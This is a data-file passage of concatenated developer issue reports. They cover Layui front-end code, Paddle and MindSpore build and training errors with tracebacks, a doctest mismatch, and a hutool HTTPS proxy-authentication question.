,shade: 0 //不显示遮罩 ,yes: function(){ layer.closeAll(); } }); } }); console.log(""uploadInst===""+JSON.stringify(uploadInst)); //重载该实例，支持重载全部基础参数 uploadInst.reload({ elem: '#test2' ,url: ""&lt;c:url value='/oss/upload'/&gt;"" //OSS图片上传 ,auto: true //选择文件后不自动上传 ,exts: 'jpg|png|jpeg|gif|bmp' //图片格式校验 ,multiple: true }); }); } $(document).on(""mouseenter mouseleave"", "".file-iteme"", function(event){ if(event.type === ""mouseenter""){ //鼠标悬浮 $(this).children("".handle"").fadeIn(""fast""); }else if(event.type === ""mouseleave"") { //鼠标离开 $(this).children("".handle"").hide(); } }); // 删除图片 $(document).on(""click"", "".file-iteme .handle"", function(event){ var prodimgId=$(this).parent().attr(""id""); /*layer.open({ type: 1 ,offset: 'auto' //具体配置参考：http://www.layui.com/doc/modules/layer.html#offset ,content: '&lt;div style=""padding: 20px 100px;""&gt;'+ ""删除商品宣传图成功"" +'&lt;/div&gt;' ,btn: '关闭全部' ,btnAlign: 'c' //按钮居中 ,shade: 0 //不显示遮罩 ,yes: function(){ layer.closeAll(); } });*/ if(!Util.isEmpty(prodimgId)){ var param = {}; param.prodimgIds = prodimgId; Util.post(deleteImgUrl, param, null, null); } $(this).parent().remove(); }); &lt;/div&gt; &lt;/blockquote&gt; &lt;/div&gt;"
小白提问，如何动态渲染表格里的select。,版本：Layui 2.7.6 描述：参考了别人的issue 以及 @sunxiaobin 之前的demo。忘记原帖在哪了。功能是动态增加一行空的表格数据，在表格里有联动select。功能实现了，数据也能存储table.cache。但是每次点击新增一行或者删除一行，表格里的select，都好像刷新了一样，显示并不是选中的项（虽然数据没变）。 如何把原来已经选择好的select，不刷新（停留在选中的项）。小白请教！ 全部代码   <code>: 已解决了
manylinux cuda8 build fails due to grpc  /generic/generic_stub.h missing,"http://172.19.32.197:8111/viewLog.html?tab=buildLog&amp;logTab=tree&amp;filter=debug&amp;expand=all&amp;buildId=36050&amp;_focus=4850   <code>: [09:18:32] [Step 1/4] In file included from /paddle/paddle/fluid/operators/gen_nccl_id_op.cc:24:0: [09:18:32] [Step 1/4] /paddle/paddle/fluid/operators/detail/grpc_client.h:27:41: fatal error: grpc++/generic/generic_stub.h: No such file or directory [09:18:32] [Step 1/4] #include ""grpc++/generic/generic_stub.h"" [09:18:32] [Step 1/4] ^ [09:18:32] [Step 1/4] compilation terminated."
如何设置WdatePicker.js的结束时间大于开始时间,"使用 maxDate:'#F{$dp.$D('endRecordDate')}'导致时间框无法点击,更别说实现效果了!   <code>: &lt;div class=""form-group""&gt; &lt;label class=""control-label""&gt;${text('日期')}：&lt;/label&gt; &lt;div class=""control-inline""&gt; &lt;#form:input path=""recordDate"" readonly=""true"" maxlength=""20"" class=""form-control Wdate-datetime"" dataFormat=""datetime"" onclick=""WdatePicker({dateFmt:'yyyy-MM-dd',isShowClear:false, maxDate:'#F{$dp.$D(\'endRecordDate\')}'});""/&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=""form-group""&gt; &lt;div class=""control-inline""&gt; &lt;#form:input path=""endRecordDate"" readonly=""true"" maxlength=""20"" class=""form-control Wdate-datetime"" dataFormat=""datetime"" onclick=""WdatePicker({dateFmt:'yyyy-MM-dd',isShowClear:false});""/&gt; &lt;/div&gt; &lt;/div&gt;"
分布式训练报错：Failed to get num of devices for group,"分布式训练报如下错误： /mode graph （编译模式） 无 模型定义   <code>: import mindspore.nn as nn from mindspore import ops from src.model_utils.config import config class AlexNet(nn.Cell): """""" Alexnet """""" def __init__(self): super(AlexNet, self).__init__() self.fc1 = nn.Dense(128, 256, has_bias=False) self.fc1.matmul.shard(((config.dp, 1), (config.mp, 1))) self.fc2 = nn.Dense(256, 512, has_bias=False) self.fc2.matmul.shard(((config.dp, config.mp), (1, config.mp))) def construct(self, x): """"""define network"""""" x = self.fc1(x) x = self.fc2(x) x = ops.reduce_mean(x, 0) x = ops.reduce_mean(x, 0) return x 2. 分布式训练脚本： ```python # Copyright 2020 Huawei Technologies Co., Ltd # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ============================================================================ """""" ######################## train alexnet example ######################## train alexnet and get network model files(.ckpt) : python train.py --data_path /YourDataPath """""" import os from mindspore.nn import Cell from mindspore.profiler import Profiler from mindspore.train.callback import LossMonitor, TimeMonitor, CheckpointConfig, ModelCheckpoint from src.model_utils.config import config from src.model_utils.moxing_adapter import moxing_wrapper from src.model_utils.device_adapter import get_device_id, get_rank_id, get_job_id from src.dataset import create_dataset_cifar10 from src.generator_lr import get_lr_cifar10, get_lr_imagenet from src.alexnet import AlexNet from src.get_param_groups import get_param_groups import mindspore.nn as nn from mindspore.communication.management import init, get_rank from mindspore import dataset as de from mindspore import context from mindspore import Tensor, ops from mindspore.train import Model from mindspore.context import ParallelMode from mindspore.common import set_seed import numpy as np from termcolor import cprint set_seed(1) de.config.set_seed(1) class OpsReduceSum(Cell): def __init__(self): super(OpsReduceSum, self).__init__() def construct(self, x, y): return ops.add(x, y) def modelarts_pre_process(): pass @moxing_wrapper(pre_process=modelarts_pre_process) def train_alexnet(): print(config) cprint(f'device id: {get_device_id()}', on_color='on_red') # print('device num:', config.device_num) cprint(f'rank id: {get_rank_id()}', on_color='on_red') cprint(f'job id: {get_job_id()}', on_color='on_red') device_num = config.dp * config.mp context.set_context(mode=context.GRAPH_MODE, save_graphs=True, device_target='Ascend', device_id=get_device_id(), save_graphs_path=f""bs{config.batch_size}_dn{config.device_num}_dp{config.dp}_mp{config.mp}"") print(""set save_graphs ...."") cprint(f""device_num={device_num}, device_id={get_device_id()}"", on_color='on_red') context.reset_auto_parallel_context() context.set_auto_parallel_context(device_num=device_num, full_batch=True, global_rank=0, parallel_mode=ParallelMode.SEMI_AUTO_PARALLEL, gradients_mean=True) profiler = Profiler(subgraph='all', is_detail=True, is_show_op_path=False, output_path='./data') init() network = AlexNet() cprint(network.trainable_params(), on_color='on_red') metrics = None step_per_epoch = 10000 lr = Tensor(get_lr_imagenet(config.learning_rate, config.epoch_size, step_per_epoch)) opt = nn.Momentum(params=network.trainable_params(), learning_rate=lr, momentum=config.momentum) from mindspore.train.loss_scale_manager import DynamicLossScaleManager, FixedLossScaleManager if config.is_dynamic_loss_scale == 1: loss_scale_manager = DynamicLossScaleManager(init_loss_scale=65536, scale_factor=2, scale_window=2000) else: loss_scale_manager = FixedLossScaleManager(config.loss_scale, drop_overflow_update=False) model = Model(network, loss_fn=OpsReduceSum(), optimizer=opt, metrics=metrics, amp_level=""O2"", keep_batchnorm_fp32=False, loss_scale_manager=loss_scale_manager) cprint(""============== Starting Training =============="", on_color='on_red') for i in range(1): model.train_network.compile(Tensor(np.ones([config.batch_size, 128]).astype(np.float32)), Tensor(np.ones([1]).astype(np.int32))) profiler.analyse() if __name__ == ""__main__"": train_alexnet() 3. 执行训练任务 ```shell export RANK_TABLE_FILE=/home/z00448363/mindspore/model_zoo/utils/hccl_tools/hccl_1p_6_0.0.0.22.json export DEVICE_ID=6 export RANK_ID=0 python train.py --device_id=6 --dp=2 --mp=1 ### Describe the expected behavior / 预期结果 (Mandatory / 必填) 预期顺利编译成功 ### Related log / screenshot / 日志 / 截图 (Mandatory / 必填) 打印了部分结果： () ### Special notes for this issue/备注 (Optional / 选填)"
[MS][NET][DeepText][ascend910] Dataset processing failed,": /device ascend : -- MindSpore version :commit_id:bc71000ad -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_deetext_icdar_perf.py get code from model_zoo sh run_standalone_train_ascend.sh Dataset processing failed network train success DeepText网络在ascend910环境数据处理失败   <code>: Traceback (most recent call last): File ""train.py"", line 199, in &lt;module&gt; run_train() File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/deeptext/network/test_ms_deeptext_icdar_perf/scripts/train/model_utils/moxing_adapter.py"", line 105, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 195, in run_train model.train(5, dataset, callbacks=cb, dataset_sink_mode=True, sink_size=100) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 715, in train sink_size=sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 500, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 553, in _train_dataset_sink_process dataset_helper=dataset_helper) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 345, in _exec_preprocess dataset_helper = DatasetHelper(dataset, dataset_sink_mode, sink_size, epoch_num) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 245, in __init__ self.iter = iterclass(dataset, sink_size, epoch_num) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 393, in __init__ super().__init__(dataset, sink_size, epoch_num) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 300, in __init__ create_data_info_queue=create_data_info_queue) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/_utils.py"", line 63, in _exec_datagraph dataset_types, dataset_shapes = _get_types_and_shapes(exec_dataset) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/_utils.py"", line 52, in _get_types_and_shapes dataset_types = _convert_type(dataset.output_types()) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/engine/datasets.py"", line 1561, in output_types self.saved_output_shapes = runtime_getter[0].GetOutputShapes() RuntimeError: Exception thrown from PyFunc. map operation: [PyFunc] failed. The corresponding data files: /home/workspace/mindspore_dataset//ICDAR-SCUT-FORU-CocoText/mindrecord/Deeptext-TRAIN0. Error description: ValueError: Caught ValueError in map(or batch) worker and execute python function. Original Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/transforms/py_transforms_util.py"", line 185, in __call__ result = self.transform(*args) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/deeptext/network/test_ms_deeptext_icdar_perf/scripts/train/src/dataset.py"", line 468, in &lt;lambda&gt; compose_map_func = (lambda image, annotation: preprocess_fn(image, annotation, is_training)) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/deeptext/network/test_ms_deeptext_icdar_perf/scripts/train/src/dataset.py"", line 336, in preprocess_fn return _data_aug(image, box, is_training) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/deeptext/network/test_ms_deeptext_icdar_perf/scripts/train/src/dataset.py"", line 330, in _data_aug input_data = resize_column(*input_data) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/deeptext/network/test_ms_deeptext_icdar_perf/scripts/train/src/dataset.py"", line 170, in resize_column img_data, (config.img_width, config.img_height), interpolation=cv2.INTER_LINEAR) ValueError: too many values to unpack (expected 3) At: /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/core/py_util_helpers.py(62): reraise /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/transforms/py_transforms_util.py(188): __call__"
nn.Linear 的 name 参数没有作为 weight 和 bias 的 prefix,中传入的 参数不生效，和文档描述不符 https://github.com/PaddlePaddle/Paddle/blob/ffa88c31c2da5090c6f70e8e9b523356d7cd5e7f/python/paddle/nn/layer/common.py#L133 涉及到的是否还有其他 Layer?   <code>: nn.Linear name
表单选择无法记住选项？,"参考DEMO中的TABLE/REMEMBER进行操作点击下页的时候，无法记住上页的选择页面，这个是怎么回事呢？ 这是service 层的东西   <code>: &lt;!DOCTYPE html&gt; &lt;html lang=""zh"" xmlns:th=""http://www.thymeleaf.org"" xmlns:shiro=""http://www.pollix.at/thymeleaf/shiro""&gt; &lt;head&gt; &lt;th:block th:include=""include :: header('部门列表')"" /&gt; &lt;/head&gt; &lt;body class=""gray-bg""&gt; &lt;div class=""container-div""&gt; &lt;div class=""row""&gt; &lt;div class=""col-sm-12 search-collapse""&gt; &lt;form id=""dept-form""&gt; &lt;div class=""select-list""&gt; &lt;ul&gt; &lt;li&gt; 部门名称：&lt;input type=""text"" name=""deptName""/&gt; &lt;/li&gt; &lt;li&gt; 部门状态：&lt;select name=""status"" th:with=""type=${@dict.getType('sys_normal_disable')}""&gt; &lt;option value=""""&gt;所有&lt;/option&gt; &lt;option th:each=""dict : ${type}"" th:text=""${dict.dictLabel}"" th:value=""${dict.dictValue}""&gt;&lt;/option&gt; &lt;/select&gt; &lt;/li&gt; &lt;li&gt; &lt;a class=""btn btn-primary btn-rounded btn-sm"" onclick=""$.treeTable.search()""&gt;&lt;i class=""fa fa-search""&gt;&lt;/i&gt;&amp;nbsp;搜索&lt;/a&gt; &lt;a class=""btn btn-warning btn-rounded btn-sm"" onclick=""$.form.reset()""&gt;&lt;i class=""fa fa-refresh""&gt;&lt;/i&gt;&amp;nbsp;重置&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;div class=""col-sm-12 select-table table-striped""&gt; &lt;table id=""bootstrap-table""&gt;&lt;/table&gt; &lt;/div&gt; &lt;form id=""#modalDept""&gt; &lt;input type=""hidden"" id=""#modalDeptSelection"" class=""modalDeptSelection"" name=""id""/&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;th:block th:include=""include :: footer"" /&gt; &lt;th:block th:include=""include :: fs-module-fs-httptool-js"" /&gt; &lt;script th:inline=""javascript""&gt; //var datas = [[${@dict.getType('sys_normal_disable')}]]; var prefix = ctx + ""system/dept"" $(function() { var options = { url: prefix + ""/listPage"", sortName: ""dept_id"", modalName: ""机构"", rememberSelected: true, queryParams:queryParams, columns: [{ //filed:'remark', //title:'选中情况', field:'state', checkbox: true, formatter:function(value,row,index){//设置满足条件的行可以使用复选框 //console.log(""value:""+JSON.stringify(value)); console.log(""row:""+JSON.stringify(row)); //console.log(""index:""+JSON.stringify(index)); if(row['remark']==""checked""){ return true; } else return false; } }, { field: 'dept_id', visible: false }, { field: 'deptName', title: '部门名称', align: ""left"" }, { field: 'orderNum', title: '排序', align: ""left"" }, { field: 'status', title: '状态', align: ""left"" }, { field: 'createTime', title: '创建时间', align: ""left"" }//, //{ // field: 'remark', // title: '标识符', // align: ""left"" //checkbox: true //} ] }; $.table.init(options); }); function queryParams(params) { var search = $.table.queryParams(params); var id = $.getUrlParam(""id""); if(id==null){ id =""""; } search = $.extend(search,{""id"":id}); //console.log(""rows is search:""+JSON.stringify(search)); return search; } function submitHandler(index, layero) { var rows = $.table.selectColumns(""deptName""); var rowsid = $.table.selectColumns(""deptId""); if (rows.length == 0) { //$.modal.alertWarning(""请至少选择一条记录""); //return; parent.$(layero.view).val(null); parent.$(layero.id).val(null); } $.modal.close(); // 父页面的方法 // parent.selectUsers(); // 父页面的变量 //$('.modalDeptSelection').val(rows.join()); var idar; var viewar; //parent.$(layero.view).val(idar.concat(parent.$(layero.view).val(),rows.join())); //parent.$(layero.id).val(viewar.concat(parent.$(layero.id).val(),rowsid.join("","")));//%2C parent.$(layero.view).val(rows.join()); parent.$(layero.id).val(rowsid.join("",""));//%2C } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; @RequiresPermissions(""system:dept:list"") @RequestMapping(""/listPage"") @ResponseBody public TableDataInfo listPage(String id)//@RequestParam(value=""id"",required=false) { System.out.println(""public TableDataInfo listPage(SysDept dept) id:""+id); startPage(); SysDept dept = new SysDept(); List&lt;SysDept&gt; deptList = deptService.selectDeptList(dept); if(id!=null&amp;&amp;!id.isEmpty()) { String[] items = id.trim().split("",""); List&lt;String&gt; deptids; if(items.length!=0) { deptids = Arrays.asList(items); //System.out.println(""public TableDataInfo listPage(SysDept dept) id:""+deptids.toString()); for(String str:deptids) { for(SysDept depttmp:deptList) { if(depttmp.getDeptId().equals(Long.valueOf(str))) { depttmp.setRemark(""checked""); } else depttmp.setRemark(""""); } } } } return getDataTable(deptList); }"
"[CT][MS][generate]net call subnet, second grad core dump","32号网络，二阶导core dump / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :27a9d458, master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph python test_monad32.py pass core dump [INFO] CORE(30054,7f77923cc740,python):2022-07-26-09:55:36.822.258 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'LessEqual', it's now doing infer shape. [INFO] CORE(30054,7f74dffff700,python):2022-07-26-09:55:36.824.261 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'GreaterEqual', it's now doing infer shape. [INFO] CORE(30054,7f74ddffb700,python):2022-07-26-09:55:36.826.741 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'Equal', it's now doing infer shape. [INFO] CORE(30054,7f74df7fe700,python):2022-07-26-09:55:36.827.208 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'Equal', it's now doing infer shape. [INFO] CORE(30054,7f74ddffb700,python):2022-07-26-09:55:36.829.682 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'Equal', it's now doing infer shape. [INFO] CORE(30054,7f74deffd700,python):2022-07-26-09:55:36.832.349 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'Equal', it's now doing infer shape. [INFO] CORE(30054,7f74bf7fe700,python):2022-07-26-09:55:36.832.685 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'LessEqual', it's now doing infer shape. [INFO] CORE(30054,7f74bdffb700,python):2022-07-26-09:55:36.833.708 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'LessEqual', it's now doing infer shape. [INFO] CORE(30054,7f749f7fe700,python):2022-07-26-09:55:36.838.937 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'GreaterEqual', it's now doing infer shape. [INFO] CORE(30054,7f74df7fe700,python):2022-07-26-09:55:36.841.746 [mindspore/core/ops/op_utils.cc:68] BroadCastInferShape] For 'GreaterEqual', it's now doing infer shape.   <code>: from mindspore.nn import Cell, CellList from mindspore.common import Tensor, dtype, Parameter import mindspore.ops.functional as F import numpy as np class SubNet0(Cell): def construct(self, x): if (1 &lt;= x): return x elif (x &gt;= 2): return x elif (test(x) &gt;= x): p = (x - 3) elif (x &lt;= test(x)): x = (test(x) * x) return x class SubNet1(Cell): def construct(self, x): while (test(x) == x): j = (x * 3) if (x &lt;= test(x)): break return x class SubNet2(Cell): def construct(self, x): while (x &lt; test(x)): e = (x + x) if (3 &gt; x): break return x def test(x): for j in [2, -1, -1]: x = (x + x) x = (x + 3) if (x &lt; 0): break return x class Net(Cell): def __init__(self, snet0, snet1, snet2): super().__init__() self.w = Parameter(Tensor([(- 4)], dtype.float32), name='w') self.b = Parameter(Tensor([0], dtype.float32), name='b') self.subnet0 = snet0 self.subnet1 = snet1 self.subnet2 = snet2 self.cell_list = [snet0, snet1, snet2] self.cell_list = CellList(self.cell_list) def subfunc(self, z, y, x): if (self.w == self.subnet2(x)): self.w = (test(self.w) * z) x = (y - 1) elif (y &lt; self.subnet2(y)): y = (self.subnet1(z) * z) elif (x &lt; y): return y else: a = (x * self.subnet2(x)) return self.w def construct(self, x, y): if (self.subfunc(y, self.b, y) &lt;= x): y = (y + x) elif (4 &gt;= self.w): if (y == self.subfunc(y, self.w, self.b)): y = (self.subfunc(y, y, x) - x) elif (y &lt;= 1): return self.w else: g = (y / self.w) elif (self.subnet1(y) &lt; x): while (self.subnet0(x) &lt; self.b): x = (1 / y) y = (2 * y) else: self.w = (x / test(x)) return (x + y) x = np.array([5], np.float32) y = np.array([-1], np.float32) snet0 = SubNet0() snet1 = SubNet1() snet2 = SubNet2() net2 = Net(snet0, snet1, snet2) grad_net1 = F.grad(net2, grad_position=(0, 1)) sgrad_net = F.grad(grad_net1) sgrad = sgrad_net(Tensor(x), Tensor(y)) print('second grad: ', sgrad)"
[CT][MS][SegmentProd] The document of SegmentProd operator need to modify.,"The document of SegmentProd operator need to modify The document of SegmentProd operator need to modify sample的实际结果和预期结果有格式上的差别，实际输出多了空格 / 硬件环境: /device ascend/CPU/ : -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph the sample of SegmentProd in the document pytest -vra --doctest-modules -o doctest_optionflags=NORMALIZE_WHITESPACE --tb=long array_ops.py::mindspore.ops.operations.array_ops.SegmentProd run pass and no error   <code>: (zhujunan2) root@ubuntu:~/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/ops/operations# pytest -vra --doctest-modules -o doctest_optionflags=NORMALIZE_WHITESPACE --tb=long array_ops.py::mindspore.ops.operations.array_ops.SegmentProd =========================================================================== test session starts =========================================================================== platform linux -- Python 3.7.5, pytest-5.3.5, py-1.8.1, pluggy-0.13.1 -- /root/miniconda3/envs/zhujunan2/bin/python cachedir: .pytest_cache rootdir: /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/ops/operations plugins: timeout-1.4.2, repeat-0.9.1 collected 1 item array_ops.py::mindspore.ops.operations.array_ops.SegmentProd FAILED [100%] ================================================================================ FAILURES ================================================================================= ________________________________________________________ [doctest] mindspore.ops.operations.array_ops.SegmentProd _________________________________________________________ 8132 8133 Supported Platforms: 8134 ``Ascend`` ``CPU`` 8135 8136 Examples: 8137 &gt;&gt;&gt; x = Tensor([[1, 2, 3], [4, 5, 6], [7, 8, 9]], mstype.float64) 8138 &gt;&gt;&gt; segment_ids = Tensor([0, 0, 2], mstype.int64) 8139 &gt;&gt;&gt; op = ops.SegmentProd() 8140 &gt;&gt;&gt; output = op(x, segment_ids) 8141 &gt;&gt;&gt; print(output) Differences (unified diff with -expected +actual): @@ -1,3 +1,3 @@ -[[4. 10. 18.] - [1. 1. 1.] - [7. 8. 9.]] +[[ 4. 10. 18.] + [ 1. 1. 1.] + [ 7. 8. 9.]] /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/ops/operations/array_ops.py:8141: DocTestFailure ========================================================================= short test summary info ========================================================================= FAILED array_ops.py::mindspore.ops.operations.array_ops.SegmentProd ============================================================================ 1 failed in 0.25s ============================================================================"
Forked了全部在Gitee上有代码库的LayuiPlugin,插件链接地址：原官网插件 牢骚：爱谁看就谁看！   <code>: 谁说JQ已死，我怎么觉得这么悲催呢，VB死了吗，ruby死了吗，cobol死了吗，在中国互联网发展的太快了，只发现市面上有人开始用VUE REACT就觉得新时代来临了，殊不知底层各种类型公司做的各种系统都一直存在，难道让他们一瞬间都转变吗。
反向传播出错,"platform: AIStudio Version: 2.0.2 在程序中我是用出错，其中的, 的，即有梯度信息，没有，我想知道这个报错信息代表什么意思   <code>: logits.backward(grad) logits stop_gradient=False grad stop_gradient=True logits grad W0424 14:49:52.979720 9582 device_context.cc:362] Please NOTE: device: 0, GPU Compute Capability: 7.0, Driver API Version: 10.1, Runtime API Version: 10.1 W0424 14:49:52.984573 9582 device_context.cc:372] device: 0, cuDNN Version: 7.6. softmax weight init successfully! softmax weight mom init successfully! Epoch 0: LambdaDecay set learning rate to 0.0125. Epoch 0: LambdaDecay set learning rate to 0.0125. 2021-04-24 14:50:08,572 - INFO - Total Step is: 1455663 /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/tensor/creation.py:143: DeprecationWarning: `np.object` is a deprecated alias for the builtin `object`. To silence this warning, use `object` by itself. Doing this will not modify any behavior and is safe. Deprecated in NumPy 1.20; for more details and guidance: https://numpy.org/devdocs/release/1.20.0-notes.html#deprecations if data.dtype == np.object: /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py:89: DeprecationWarning: `np.bool` is a deprecated alias for the builtin `bool`. To silence this warning, use `bool` by itself. Doing this will not modify any behavior and is safe. If you specifically wanted the numpy scalar type, use `np.bool_` here. Deprecated in NumPy 1.20; for more details and guidance: https://numpy.org/devdocs/release/1.20.0-notes.html#deprecations if isinstance(slot[0], (np.ndarray, np.bool, numbers.Number)): /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/nn/layer/norm.py:648: UserWarning: When training, we now always track global mean and variance. ""When training, we now always track global mean and variance."") VarType.FP32 Traceback (most recent call last): File ""train_single.py"", line 100, in &lt;module&gt; main(args_) File ""train_single.py"", line 69, in main x_grad, loss_v = module_partial_fc.forward_backward(label, features, opt_pfc) File ""/home/aistudio/partial_fc.py"", line 148, in forward_backward logits.backward(grad) File ""&lt;/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/decorator.py:decorator-gen-114&gt;"", line 2, in backward File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/wrapped_decorator.py"", line 25, in __impl__ return wrapped_func(*args, **kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/framework.py"", line 225, in __impl__ return func(*args, **kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dygraph/varbase_patch_methods.py"", line 177, in backward self._run_backward(framework._dygraph_tracer(), retain_graph) TypeError: _run_backward(): incompatible function arguments. The following argument types are supported: 1. (self: paddle.fluid.core_avx.VarBase, arg0: paddle::imperative::Tracer, arg1: bool) -&gt; None Invoked with: Tensor(shape=[64, 85742], dtype=float32, place=CUDAPlace(0), stop_gradient=False, [[-30.68324471, -0.00000280 , -0.00000280 , ..., -0.00000280 , -0.00000280 , -0.00000280 ], [-30.68324471, -0.00000280 , -0.00000280 , ..., -0.00000280 , -0.00000280 , -0.00000280 ], [-30.68324471, -0.00000280 , -0.00000280 , ..., -0.00000280 , -0.00000280 , -0.00000280 ], ..., [-30.68324471, -0.00000280 , -0.00000280 , ..., -0.00000280 , -0.00000280 , -0.00000280 ], [-30.68324471, -0.00000280 , -0.00000280 , ..., -0.00000280 , -0.00000280 , -0.00000280 ], [-30.68324471, -0.00000280 , -0.00000280 , ..., -0.00000280 , -0.00000280 , -0.00000280 ]]), &lt;paddle.fluid.dygraph.tracer.Tracer object at 0x7f1eb0d865f0&gt;, Tensor(shape=[64, 85742], dtype=float32, place=CUDAPlace(0), stop_gradient=True, [[-0.01562500, 0.00000018, 0.00000018, ..., 0.00000018, 0.00000018, 0.00000018], [-0.01562500, 0.00000018, 0.00000018, ..., 0.00000018, 0.00000018, 0.00000018], [-0.01562500, 0.00000018, 0.00000018, ..., 0.00000018, 0.00000018, 0.00000018], ..., [-0.01562500, 0.00000018, 0.00000018, ..., 0.00000018, 0.00000018, 0.00000018], [-0.01562500, 0.00000018, 0.00000018, ..., 0.00000018, 0.00000018, 0.00000018], [-0.01562500, 0.00000018, 0.00000018, ..., 0.00000018, 0.00000018, 0.00000018]]) terminate called without an active exception -------------------------------------- C++ Traceback (most recent call last): -------------------------------------- 0 paddle::framework::SignalHandle(char const*, int) 1 paddle::platform::GetCurrentTraceBackString[abi:cxx11]() ---------------------- Error Message Summary: ---------------------- FatalError: `Process abort signal` is detected by the operating system. [TimeInfo: *** Aborted at 1619247010 (unix time) try ""date -d @1619247010"" if you are using GNU date ***] [SignalInfo: *** SIGABRT (@0x3e80000256e) received by PID 9582 (TID 0x7f1dc4ffd700) from PID 9582 ***] Aborted (core dumped)"
访问https的网站，加上代理，会把proxy_authorization头去掉，请求http的能正常,"JDK版本： openjdk_8_201 hutool版本： 5.5.2 代理那边返回407，确认代理没问题   <code>: System.setProperty(""jdk.http.auth.tunneling.disabledSchemes"", """"); HttpResponse execute = HttpRequest.get(""https://www.baidu.com"") .basicProxyAuth(""t10757311"", ""ikm5"") .setHttpProxy(""xxxxxxx"", 15818) .execute();"
MindSpore AddN backward operator shape error in PyNative mode,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 在使用MindSpore 1.3.0+Ascend训练seq2seq模型时出现AddN反向算子shape报错问题（报错信息如下），经定位为MindSpore后端优化阶段针对某些算子的shape编译错误： Fix the error above and push the patch into the version.   <code>: v1.3.0 Python 3.7.5 Linux Ubuntu 18.04 Traceback (most recent call last): File ""/usr/local/python3.7.5/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 212, in &lt;module&gt; result = compile_with_json(in_args) File ""/usr/local/python3.7.5/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 206, in compile_with_json ret = build_op(op_build, json_str, None) File ""/usr/local/python3.7.5/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 162, in build_op raise RuntimeError(e) RuntimeError: ({'errCode': 'E80000', 'op_name': 'AddN_17658003484443355035_0', 'param_name': 'shape of input', 'excepted_value': [1, 16, 6, 16, 16], 'real_value': [16, 6, 16, 16]}, 'In op[AddN_17658003484443355035_0], the parameter[shape of input] should be , but actually is [[16, 6, 16, 16]].') input_args: {""SocInfo"": {""autoTilingMode"": ""NO_TUNE"", ""coreNum"": """", ""coreType"": """", ""l1Fusion"": ""false"", ""l2Fusion"": ""false"", ""l2Mode"": ""2"", ""op_debug_level"": """", ""op_impl_mode"": """", ""op_impl_mode_list"": [], ""socVersion"": ""Ascend910A""}, ""impl_path"": """", ""op_info"": {""Type"": ""AddN"", ""attr_desc"": [2], ""attrs"": [{""name"": ""n"", ""valid"": true, ""value"": 